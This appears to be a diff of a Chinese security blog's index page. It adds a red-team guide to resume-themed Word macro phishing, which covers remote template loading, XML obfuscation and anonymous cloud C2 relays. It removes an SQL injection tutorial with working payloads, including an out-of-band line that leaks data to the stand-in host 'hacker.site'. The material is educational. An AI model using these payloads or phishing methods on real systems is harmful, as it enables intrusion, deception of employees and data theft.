@@ -152,6 +152,129 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-word宏邮件钓鱼-远程加载模板" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/">word宏邮件钓鱼-远程加载模板</a>
+    </h1>
+  
+
+        
+        <a href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/" class="archive-article-date">
+  	<time datetime="2021-06-17T03:23:06.426Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间有幸向一位师傅学习钓鱼手法，而钓鱼也是一门比较深的手艺，在笔者目前看来，涉及到社会工程（语言技巧、诱导欺骗）、样本免杀（包括过邮件沙箱、邮件网关、终端EDR免杀等）、C2（云函数、云转发、能否出网）等。尤其在大公司中，对于邮件钓鱼已经有较多的防范，我们前期的样本制作就更需要费一番心思。</p>
+<p>笔者使用GadgetToJScript + ColbatStrike 的方式进行木马制作，钓鱼手法为word宏+图片诱导+远程模板加载+hta命令执行，在近期red team行动中也成功钓到重要公司的的员工。 </p>
+<p>本文主要描写笔者如何进行word宏邮件钓鱼，记录笔者的一些心得，也是一篇笔记。</p>
+<h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><p>知道目标公司后，笔者通常喜欢通过投递简历的方式进行钓鱼，其中较为麻烦的就是简历编造的这一过程了，有时需要写得华丽、专业，有时需要写得朴素、简单，根据岗位投其所好，实乃耗费精力。有人对我说简历上不必花费过多精力，只要有人点击[启用]即可，不必管太多。但笔者认为，一方面，合理的简历可以降低鱼儿的警惕，避免让其发现异常找”网关“，而如果样本被分析，泄露C2了云转发地址，对我们这次的钓鱼行动是致命的。毕竟云服务供应商是有限的，公司安全运营人员一直在尝试封禁所有能利用的云转发地址，我们手头能利用的云服务商也见底了，即便见底后采用社交论坛C2回连方式也不太实用，不到万不得已我想没人喜欢这样玩。另外一方面，</p>
+<p>通过在google/baidu/soso(wechat)中搜索 ”xx招聘“ 等关键字，尽量搜寻个人邮箱，且时间上最好是近一个月的。而我们邮件钓鱼需要尽量避免向群邮件投递或者通过网站进行投递，群邮件投递容易被发现异常，网站投递可能会对word进行转换导致样本失效。</p>
+<p>搜寻信息过程中，将收集到到得信息先一一记录，并标注好招聘发布的时间、岗位、目标邮箱、岗位信息。</p>
+<h2 id="简历编写与投递"><a href="#简历编写与投递" class="headerlink" title="简历编写与投递"></a>简历编写与投递</h2><p>简历创建时，建议选择word官方模板”蓝色球简历“，它直接带有本地模板加载的res，方面我们后面直接修改为远程模板加载。</p>
+<p>简历模板样式建议参考BOSS直聘的在线简历模板。</p>
+<p>工作经历这块，可以在相关招聘网站中查找相关工作，直接修改为工作经历。</p>
+<p>简历投递时，邮件内的介绍十分重要，需要引起对方感兴趣，另外也为了避免被邮件网关判断为垃圾邮件。</p>
+<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/4.png" alt></p>
+<h2 id="远程模板（宏）"><a href="#远程模板（宏）" class="headerlink" title="远程模板（宏）"></a>远程模板（宏）</h2><p>首先制作dotm，在word中新建一个空白文档，之后在此出编写vba脚本。此处的脚本主要作用是执行命令，进行后门植入与持久化工作。</p>
+<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/1.png" alt></p>
+<p>另外，让人纠结的一点是，如果不添加诱导，通常是不大可能会有人上当的；而添加了诱导，会增加我们钓鱼行动暴露的风险。笔者通常会选择添加诱导点击，做法是在vba脚本中编写一段函数，用于自动删除前面文档前面两张图片，其中一种图片是简历得模糊图片，另外一张是提示用户启用宏。一旦用户启用宏后，脚本自动删除图片后，用户看到的是一封正常的简历。</p>
+<p>随后修改前面我们编写的简历（docx）的/word/_rels/settings.xml.rels文件，将其修改为远程加载，为了避免被检测，我们可以通过利用一些XML的特性来进行混淆，相关手法参考笔者的一些文章或者在互联网进行搜索即可。这里使用CP037进行混淆：</p>
+<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/3.png" alt></p>
+<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/2.png" alt></p>
+<h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><p>由于目标公司出网限制得十分严格，也对CDN域名前置做了严格的检测，且出于让C2匿名的目的，我们必须使用云转发类的云服务，对C2流量进行中转。</p>
+<p>通过搜寻”serveless”、“云函数”查找相关厂商，以下是目前笔者知晓的服务商：</p>
+<table>
+<thead>
+<tr>
+<th>服务商</th>
+<th>缺陷</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>腾讯云</td>
+<td></td>
+</tr>
+<tr>
+<td>阿里云</td>
+<td>无法匿名</td>
+</tr>
+<tr>
+<td>华为云</td>
+<td>需要营业执照</td>
+</tr>
+<tr>
+<td>平安云</td>
+<td>需要营业执照</td>
+</tr>
+<tr>
+<td>亚马逊云</td>
+<td></td>
+</tr>
+<tr>
+<td>微软云</td>
+<td></td>
+</tr>
+<tr>
+<td>vercel</td>
+<td></td>
+</tr>
+<tr>
+<td>七牛云？</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>对于笔者这种愣头青，在钓鱼时比较痛苦的还是文章杜撰这块，其他方面还是比较欢乐的。</p>
+<p>另外，直接的外网入口迟迟无法拿到的情况下，通过钓鱼的方式拿到内网入口也让人稍许欣慰。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-开源AST实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1283,188 +1406,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/06/16/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL注入类型详解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/16/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/">SQL注入类型详解</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/16/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-06-16T15:33:56.365Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>该文章首发于信安之路（2018-01-25）</p>
-<p><a href="https://mp.weixin.qq.com/s/BQVS7alMSdy3_SQuMymkug" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BQVS7alMSdy3_SQuMymkug</a></p>
-<p>笔者最初学习 SQL 注入时，大家对于 SQL 注入类型的归类让我头脑一片混乱，后来笔者发现其实大家都是根据 sqlmap 上给出的“类型”来划分的。所以，今天在这里，笔者根据自己所学所知来对 SQL 注入进行一个分类，以及讲解一些在注入时十分重要而有用的知识，相信对初学者十分有用。</p>
-<p>本文主要使用 MySQL 来进行讲解，且重点是对整个 SQL 注入类型的探讨，以及在这些注入类型中的一些重要细节的讲解，所以不会过多讲解 SQL 语句具体语法语意等。</p>
-<p>我们知道，Sqlmap 有个参数可以直接指定注入时所用的类型：</p>
-<blockquote>
-<p><code>--technique=BEISTQU</code> [ <code>Boolean-based blind</code>, <code>Error-based queries, Inline queries</code>, <code>Stacked queries</code>, <code>Time-based blind</code>, <code>UNION query</code> ]</p>
-</blockquote>
-<p>但从实际的逻辑思路上来说，这样划分是难以理解的，BEUSTQU 是注入方式，和类型其实没有什么关系，理解这点很重要。</p>
-<p>在说 SQLI 时，首先要注意的一个要点就是判断注入位置的参数属性类型。注入位置的参数属性类型有整形和字符型，区分二者的真正意义是，整形参数之后跟的语句不必”打破变量区”，即我们在这里输入字符即可被作为 SQL 语句的一部分了。有的时候 web 开发者仅对用户输入进行了转义，而没注意一些整形参数的处理，在这种情况下就可以直接注入了。</p>
-<p>第二个要点就是，注入时所用的 <code>HTTP Request</code> 报文类型，是 GET、POST 或其他。</p>
-<p>第三个要点就是，注入点在 <code>HTTPRequest</code> 报文中的位置所在。如 HTTP 报文的头部字段，包括 Cookie、User-Agent 等，也可能发生 SQL 注入，如开发者记录用户浏览器类型到数据库，这个时候使用的是 User-Agent 头部字段，如果开发者十分大意，可能就发生注入了。</p>
-<p>sqlmap 等级 2 会检测 Cookie，等级 3 会测试 User-Agent、Referer，等级 5 会检测 host。</p>
-<h3 id="First-order-Injection"><a href="#First-order-Injection" class="headerlink" title="First order Injection"></a>First order Injection</h3><p>第一大类型，由于都是翻译的，笔者更喜欢叫它一级注入。一级注入发生在应用与用户交互的地方，web 应用获取到的用户的信息都可能发生注入</p>
-<h4 id="In-band-SQLi"><a href="#In-band-SQLi" class="headerlink" title="In-band SQLi"></a>In-band SQLi</h4><p>第一大类型中的第一个类型叫“带内 SQL 注入”，就是说攻击者可以直接与受害主机发生交互，面对面一样的。有人比喻成，攻击者与受害服务器之间有一条“信息通道”，通过这条通道攻击者可以获取到想要的信息。</p>
-<p><strong>Union Select SQLi （直接回显）</strong> </p>
-<p>联合查询 SQL 注入，这是最简单的注入类型，通常在通过 <code>order by</code> 判断 SQL 语句查询结果的列数后，使用 <code>union select</code> 或其他语句来直接查询数据，数据直接回显。</p>
-<p>可以根据下面的语句来理解该类型注入：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//1.png" alt="img"></p>
-<p><strong>Error-basedSQLi</strong></p>
-<p>中文为 “报错型 SQL 注入”，攻击者不能直接从页面得到他们的查询语句的执行结果，但通过一些特殊的方法却可以回显出来，带有一点盲注的味道。报错型注入，一般是通过特殊的数据库函数引发错误信息，而错误的回显信息又把这些查询信息给泄漏出来了。</p>
-<p>Mysql 的报错函数有12种之多（只是看过然后收集，并无验证），但实际上可能只需要熟悉两三种即可，对过 WAF 可能会有帮助。下面列出我常用的两种方法：</p>
-<p>1、<code>extractvalue</code> 函数。</p>
-<p>语句跟在 <code>AND/OR/||/&amp;&amp;</code> 后面</p>
-<blockquote>
-<p>or 1 and extractvalue(1, concat(0x3a, (select @@version),0x3a))</p>
-</blockquote>
-<p>还有下面的骚操作，注入点发生在 sql 语句的 limit 整形参数里，可以直接跟在整形参数后面（来自 hackinglab）</p>
-<blockquote>
-<p>?start=0 procedure analyse(extractvalue(rand(),concat(1,(select @@version))),1)</p>
-</blockquote>
-<p>2、<code>rand+count</code> 函数，与 union 结合，与 <code>AND/OR/||/&amp;&amp;</code> 结合都可以，十分灵活。</p>
-<blockquote>
-<p>union select count(<em>),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()</em>2))a from information_schema.columns group by a;</p>
-</blockquote>
-<blockquote>
-<p>AND(select 1 from (select count(<em>),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()</em>2))a from mysql.user group by a)b)</p>
-</blockquote>
-<p><strong>Blind SQLi ( Inferential SQLi )</strong></p>
-<p>盲注也叫逻辑推理注入，在这里，攻击者不能得到数据库错误的回显信息，也不能得到查询结果的回显信息，但可以通过其他信息来进行逻辑推理从而获取数据。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Boolean-basedSQLi</span><br></pre></td></tr></table></figure>
-
-<p>布尔型注入，构造一条布尔语句通过 AND 与前面进行逻辑上的连接，当这条布尔语句为真时，页面应该显示正常，当这条语句为假时，页面显示不正常或是少显示了一些东西。值得注意的是，在实际中，布尔值假时的表现可能为 <code>HTTP 500</code>，真时的表现为 <code>HTTP 200</code>，以及还有其他各种情况，这也是逻辑推理的真谛。</p>
-<p>还有一些细节值得注意，计算机语言的逻辑判断中，通常 AND 的优先级大于 OR，且对布尔值判断时，如果 or 的左边为真时，右边是不会执行的，而对于 AND，如果左边布尔值为假，右边也会跳过而不会执行。</p>
-<p>MySQL 有点神奇，似乎对它不影响，但是我们还是要养成好习惯；而在 mssql 与 oracle 这是要注意的，具体如下图：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//2.jpg" alt="img"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffuiaibN49MdKZ4BYWPLcYYgqBEz26l46BBccMALbZgYc573a9FhZ3Ozriaxkh3V3GAiaOqMGGbNQwfNw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//3.webp.jpg" alt="img"></p>
-<p>使用布尔型盲注来获取 MySQL 数据库数据，如查询数据库名的第一个字节的 ASCII 码十进制值是否大于 100，有如下语句：</p>
-<blockquote>
-<p>and ascii(substr(database(),1,1))&gt;100</p>
-</blockquote>
-<p>或是使用 like 的方法：</p>
-<blockquote>
-<p>and substr(database(),1,1) like ‘m’</p>
-</blockquote>
-<blockquote>
-<p>and substr(database(),1,2) like ‘my’</p>
-</blockquote>
-<p>还可以使用“突破延迟注入”的方法，因为延迟注入与布尔型注入本质上是一样的，所以这个方法在这里也可以使用，如有兴趣可以查看 FreeBuf 的公开课。</p>
-<p>还要说明一个重要的问题，PHP 与 MySQL 都是弱类型语言，在 MySQL 中你可以有 </p>
-<blockquote>
-<p>select passwd from users where username=’xx’ or 1</p>
-</blockquote>
-<p>但是在 MSSQL、Oracle 中是</p>
-<blockquote>
-<p>select passwd from users where username=’xx’ or 1=1</p>
-</blockquote>
-<p>好好体会思考 MySQL 的“弱”。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Time-based SQLi</span><br></pre></td></tr></table></figure>
-
-<p>延迟型盲注，原理大致如下，当一个查询结果为真时，则让对端数据库等待一定时间返回，否则立即返回，等待的表现是浏览器未刷新，对端服务器未应答。</p>
-<p>MySQL、MSSQL 下，当查询结果为真时利用时间函数来进行休眠，而 Oracle 没有时间函数，所以 Oracle 下会通过查询大表、大数据来达到同样的目的，MySQL 下有：</p>
-<blockquote>
-<p>and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</p>
-</blockquote>
-<p>逻辑推理注入是十分花费时间的，不得不靠工具或是小脚本来完成。Sqlmap 中，可以通过 –<code>technique t</code>，直接指定基于时间的盲注来跑。</p>
-<h4 id="Out-of-band-SQLi"><a href="#Out-of-band-SQLi" class="headerlink" title="Out-of-band SQLi"></a>Out-of-band SQLi</h4><p>带外数据（<code>OOB</code>）的这种攻击方式，在各种盲攻击中都有此概念，如在 XXE 盲注。笔者对 <code>OOB</code> 型 SQL 注入的理解是，在 SQL 注入攻击中，攻击者的 Payload 代码成功执行了，但由于各种因素所致，结果无法通过 <code>HTTP Response</code> 来答复攻击者的 <code>HTTP Request</code>，攻击者也就无法从这种“信道”获取 payload 产生的数据。而 <code>OOB</code> 中，攻击者通过构造特殊的 Payload，让受害主机向指定主机发送 HTTP 请求或 DNS 查询，而这些请求报文中携带了查询结果的数据。</p>
-<p>如 MySQL 下有：</p>
-<blockquote>
-<p>select load_file(concat(‘\\‘,version(),’.hacker.site\a.txt’));</p>
-</blockquote>
-<p>具体 DNS 查询报文如下图：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//4.webp.jpg" alt="img"></p>
-<h3 id="Second-order-Injection"><a href="#Second-order-Injection" class="headerlink" title="Second order Injection"></a>Second order Injection</h3><p>第二大类型就是二级注入了。通常网站开发者可能会十分注意与用户发生交互的地方，自然这些地方就很少会有 SQL 注入漏洞了。而开发者对从数据库查询出来的信息可能十分信任，而这就是攻击者的机会所在——即便从数据库查询出来的数据也不是可靠的。</p>
-<p>在 <code>sqli-labs</code> 的 24 关中，我们在在注册一个用户名为 <code>&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 之后，使用该用户登录，并修改该用户的密码为  <code>123</code>，可以发现，用户 <code>admin</code> 的密码被修改为 <code>123</code></p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//5.png" alt="img"></p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//6.webp.jpg" alt="img"></p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//7.webp.jpg" alt="img"></p>
-<p>在重置密码时，使用的 SQL 语句是：</p>
-<blockquote>
-<p>UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’</p>
-</blockquote>
-<p>由于变量 <code>$username</code> 的值时从数据库中查询出来，开发者并没有对其进行过滤处理，所以产生了 SQL 注入。我们在修改密码时实际上修改的时 <code>admin</code> 帐号的密码。</p>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><strong>Stacked queries</strong></p>
-<p>堆叠查询是指在一次数据库语句查询中，可以同时执行多条语句。如下面例子，我们在一次 MSSQL 数据库注入中同时执行了两条语句：</p>
-<blockquote>
-<p>select username from usertable where passwd=’123’;waitfor delay ‘0:0:5’ –%20</p>
-</blockquote>
-<p>而堆叠查询本质上还是使用的其他注入方法，只不过堆叠查询的结果无法直接回显，通常在堆叠查询中我们可以尝试使用延迟注入、<code>OOB</code> 等方法来获取数据。</p>
-<p>关于堆叠查询的发生前提情况具体可以参考下图：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//8.webp.jpg" alt="img"></p>
-<p>通过在堆叠查询中使用存储过程还可以绕过 WAF。这篇文章就是很好的例子：</p>
-<blockquote>
-<p><a href="http://www.freebuf.com/column/145771.html" target="_blank" rel="noopener">http://www.freebuf.com/column/145771.html</a></p>
-</blockquote>
-<p><strong>Inline Queries</strong></p>
-<p>Sqlmap 作者给这种注入起了个这个名字或是说使用了这个名字，中文翻译过来刚刚好和内联查询（Inner Join） 冲突了，笔者也是懵逼了很久。后来经过一番查阅，才知道这个 <code>Inline Queries</code> 指的是内联视图（Inline View）。内联视图能够创建临时表，在处理某些查询情况时十分有用。</p>
-<p>假如有 <code>User_Address</code> 表，里面有用户邮编 <code>ZIP_CODE</code>，而另外一张表 <code>User_Score</code>，则记录的每个用户的分数，且这两张表有相同的列 <code>“User_ID”</code>。</p>
-<p>如果我们想找出得分超过 200 的用户的邮编时，利用内联视图可以一句话就搞定，具体如下：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//9.webp.jpg" alt="img"></p>
-<p>可以参考 <code>SQL Inline View</code></p>
-<blockquote>
-<p><a href="https://www.1keydata.com/sql/inline-view.html" target="_blank" rel="noopener">https://www.1keydata.com/sql/inline-view.html</a></p>
-</blockquote>
-<p>进行学习。</p>
-<p>在 Sqlmap 的 <code>boundaries.xml</code> 文档中的 <code>clause</code> 标签说明中，作者给出了他们认为 SQL 语句存在注入点的 10 种情况，如下：</p>
-<p><img src="SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3//10.webp.jpg" alt="img"></p>
-<p>而 <code>Inline Queries SQLI</code> 有 <code>1、2、3、8</code> 共四种情况，笔者尝试使用 Sqlmap 来对 MySQL 的 <code>Inline Queries</code> 语句进行注入，发现 Sqlmap 识别出的注入方式并不是 <code>Inline Queries</code>，而其源码中确实有该种注入的 Payload，笔者也未曾遇到过该种注入，对此也只能表示疑惑了。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这篇文章的大体轮廓在笔者学完 SQL 注入一个星期后就开始写了，当时的笔者十分恼火，为什么找不到一篇能够帮笔者理解 SQL 注入类型的文章，所以决定自己参悟并写一篇。又经过一番学习一番修改，这篇文章就出炉了，起初想加入一些“高级点”的东西，但是和文章标题不符合，就算了，有机会再补上吧。希望本文对大家有所帮助，谢谢！</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/16/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/">展开全文 >></a>
         </p>
       
 
